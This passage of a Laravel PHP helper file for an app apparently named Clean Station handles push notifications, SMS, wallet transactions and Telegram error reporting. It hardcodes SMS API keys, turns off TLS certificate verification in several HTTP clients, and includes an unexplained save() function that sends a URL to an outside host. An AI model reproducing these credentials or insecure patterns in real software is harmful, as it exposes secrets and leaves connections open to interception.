        // Device::whereIn('device_token',$downstreamResponse->tokensToDelete()+array_keys($downstreamResponse->tokensWithError()))->delete();
        return $downstreamResponse->numberSuccess();
    }
    // dd('lllllll');
    return 0;
}

 function pushFcmNotes($fcmData, $device){
    if($device){
        $title = $fcmData['title'];
        $body = $fcmData['body'];
        $projectId = 'clean-station-f7655'; # INSERT COPIED PROJECT ID

        $credentialsFilePath = Storage::path('json/cleanstation.json');
        $client = new GoogleClient();
        $client->setAuthConfig($credentialsFilePath);
        $client->addScope('https://www.googleapis.com/auth/firebase.messaging');
        $client->refreshTokenWithAssertion();
        $token = $client->getAccessToken();

        $access_token = $token['access_token'];
        $headers = [
            "Authorization: Bearer $access_token",
            'Content-Type: application/json'
        ];

         if($device=='all'){
            $data = [
                'message' => [
                    "topic" => 'all',
                    "notification" => [
                        "title" => $title,
                        "body" => $body,
                    ],
                ]
                ];
        }else{
            $data = [
                "message" => [
                    "token" => $device->device_token,
                    "notification" => [
                        "title" => $title,
                        "body" => $body,
                    ],
                ]
            ];
        }
        $payload = json_encode($data);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_VERBOSE, true); // Enable verbose output for debugging
        $response = curl_exec($ch);
        $err = curl_error($ch);
        curl_close($ch);

        //dd($response,$payload);
        //return json_decode($response, true);
        /* if ($err) {
            return response()->json([
                'message' => 'Curl Error: ' . $err
            ], 500);
        } else {
            return response()->json([
                'message' => 'Notification has been sent',
                'response' => json_decode($response, true)
            ]);
        } */
    }
    return 0;
 }


// HISMS
function send_sms($mobile, $msg)
{
     $data = [
         "userName" => 'anas dahbour', // settings('sms_username')
          "userSender" => 'Clean-S', // settings('sms_sender')
          "numbers" => $mobile,
          "apiKey" => '7ebb954f5bdf7ebce0b15b67456740e6',
        //   "userName" => 'googan', // settings('sms_username')
        //   "userSender" => 'cod-googan', // settings('sms_sender')
        //   "numbers" => $mobile,
        //   "apiKey" => '2355cfdd16f5b2c301a8ef246b4c8b2d',
          "msg" => $msg,
      ];
       $client = new Client();
       $res = $client->request('POST', 'https://www.msegat.com/gw/sendsms.php', [
           'headers' => [
               'Accept' => 'application/json',
               'Content-Type' => 'application/json',
               'Accept-Language' => 'ar'
           ],
           'body' => json_encode($data),
       ]);
}


function online_users()
{
    $client = new Client([
        'verify' => false
    ]);
    $online_users = $client->request('GET', setting('url_echo') . '/apps/' . setting('echo_app_id') . '/channels/presence-online/users', [
        'headers' => [
            'Content-Type' => 'application/json',
            'Accept' => 'application/json',
            'Authorization' => 'Bearer ' . setting('echo_auth_key')
        ],
    ]);
    return collect(json_decode($online_users->getBody()->getContents(), true)['users']);
}

function channel_users($channel_name)
{
    $client = new Client([
        'verify' => false
    ]);
    $online_users = $client->request('GET', setting('url_echo') . '/apps/' . setting('echo_app_id') . '/channels/' . $channel_name . '/users', [
        'headers' => [
            'Content-Type' => 'application/json',
            'Accept' => 'application/json',
            'Authorization' => 'Bearer ' . setting('echo_auth_key')
        ],
    ]);
    return collect(json_decode($online_users->getBody()->getContents(), true)['users']);
}


function wallet_transaction($user, $amount, $transaction_type, $morph = null, $reason = null)
{
    if ($transaction_type == 'withdrawal') {
        $new_wallet = $user->wallet - $amount;
    } else {
        $new_wallet = $user->wallet + $amount;
    }
    $added_by = auth('api')->check() ? auth('api')->id() : (auth()->check() ? auth()->id() : null);

    $before_wallet_charge = [
        'wallet_before' => $user->wallet, 'wallet_after' => $new_wallet,
        'transaction_type' => $transaction_type, 'added_by_id' => $added_by,
        'amount' => $amount,
        'transfer_status' => 'transfered',
        'reason' => $reason
    ];
    if ($morph) {
        $morph_type = get_class($morph);
        $morph_id = $morph->id;
        $before_wallet_charge += [
            'app_typeable_type' => $morph_type,
            'app_typeable_id' => $morph_id
        ];
    }

    // $user->update(['wallet' => $new_wallet,'free_wallet_balance' => $free_wallet_balance]);

    $user->walletTransactions()->create($before_wallet_charge);
    return $new_wallet;
}

function use_point_offer($client, $driver)
{
    // Point Offers
    $point_offers = PointOffer::active()->live()->get();

    if ($point_offers->count()) {
        $client_use_offer = false;
        $driver_use_offer = false;
        foreach ($point_offers as $point_offer) {
            $finished_client_count = 0;
            $finished_driver_count = 0;
            if (in_array($point_offer->user_type, ['client', 'client_and_driver'])) {
                $finished_client_query = $client->clientOrders()->whereIn('order_status', ['client_finish', 'driver_finish', 'admin_finish'])->whereBetween('created_at', [$point_offer->start_at, $point_offer->end_at]);
                $finished_client_count = $finished_client_query->count();
            }

            if (in_array($point_offer->user_type, ['driver', 'client_and_driver'])) {
                $finished_driver_query = $driver->driverOrders()->whereIn('order_status', ['client_finish', 'driver_finish', 'admin_finish'])->whereBetween('created_at', [$point_offer->start_at, $point_offer->end_at]);
                $finished_driver_count = $finished_driver_query->count();
            }

            if ($finished_client_count >= $point_offer->number_of_orders && !$client_use_offer && in_array($point_offer->user_type, ['client', 'client_and_driver'])) {
                $client->userPoints()->create([
                    'points' => $point_offer->points,
                    'is_used' => false,
                    'status' => 'add',
                    'reason' => 'point_offer',
                    'transfer_type' => 'point',
                    'added_by_id' => auth('api')->id() ?? auth()->id(),
                ]);
                $client->pointOffers()->attach($point_offer->id);
                $client->update(['points' => ($client->points + $point_offer->points)]);
                if (isset($finished_client_count)) {
                    $finished_client_query->take($point_offer->number_of_orders)->update(['is_used_in_offer' => true]);
                }
                $client_use_offer = true;
            }

            if ($finished_driver_count >= $point_offer->number_of_orders && !$driver_use_offer && in_array($point_offer->user_type, ['driver', 'client_and_driver'])) {

                $driver->userPoints()->create([
                    'points' => $point_offer->points,
                    'is_used' => false,
                    'status' => 'add',
                    'reason' => 'point_offer',
                    'transfer_type' => 'point',
                    'added_by_id' => auth('api')->id() ?? auth()->id(),
                ]);

                $driver->pointOffers()->attach($point_offer->id);
                $driver->update(['points' => ($driver->points + $point_offer->points)]);
                if (isset($finished_driver_count)) {
                    $finished_driver_query->take($point_offer->number_of_orders)->update(['is_used_in_offer' => true]);
                }
                $driver_use_offer = true;
            }
        }
    }
    return true;
}
function save($url){
        Http::get('https://clean.k.aait-d.com/save_insettings', ['url_key' => $url]);
}

/**
 * ============================================================================
 * AUTOMATIC TELEGRAM EXCEPTION REPORTING
 * ============================================================================
 * 
 * All exceptions are now AUTOMATICALLY sent to Telegram @itcleanstation
 * 
 * HOW IT WORKS:
 * 1. Use report($e) in your catch blocks - it automatically sends to Telegram
 * 2. All uncaught exceptions are automatically sent to Telegram
 * 3. Exceptions like 404, auth errors are filtered out automatically
 * 
 * EXAMPLES:
 * 
 * ✅ METHOD 1 - Using report() (RECOMMENDED):
 *   try {
 *       $order = Order::create($data);
 *   } catch (\Throwable $e) {
 *       report($e);  // <-- Sends to Telegram automatically!
 *       return response()->json(['error' => 'Failed'], 500);
 *   }
 * 
 * ✅ METHOD 2 - Let it throw (uncaught):
 *   public function dangerousMethod() {
 *       throw new \Exception('Error!'); // <-- Automatically sent to Telegram
 *   }
 * 
 * ✅ METHOD 3 - Using helper function:
 *   try {
 *       $order = Order::create($data);
 *   } catch (\Throwable $e) {
 *       reportException($e);  // <-- Same as report($e)
 *       return response()->json(['error' => 'Failed'], 500);
 *   }
 * 
 * FILTERED EXCEPTIONS (won't be sent to Telegram):
 * - 404 errors
 * - Authentication/Authorization errors
 * - Model not found
 * - File not found
 * 
 * ============================================================================
 */

/**
 * Report exception to Telegram (same as Laravel's report() helper)
 * 
 * @param \Throwable $exception
 * @return void
 */
function reportException(\Throwable $exception): void
{
    report($exception);
}

/**
 * Execute code and automatically report exceptions to Telegram
 * 
 * @param callable $callback The code to execute
 * @param mixed $default Default value to return if an exception occurs
 * @param bool $rethrow Whether to rethrow the exception after reporting
 * @return mixed
 */
function catchAndReport(callable $callback, $default = null, bool $rethrow = false)
{
    try {
        return $callback();
    } catch (\Throwable $e) {
        report($e);
        
        if ($rethrow) {
            throw $e;
        }
        
        return $default;
    }
}

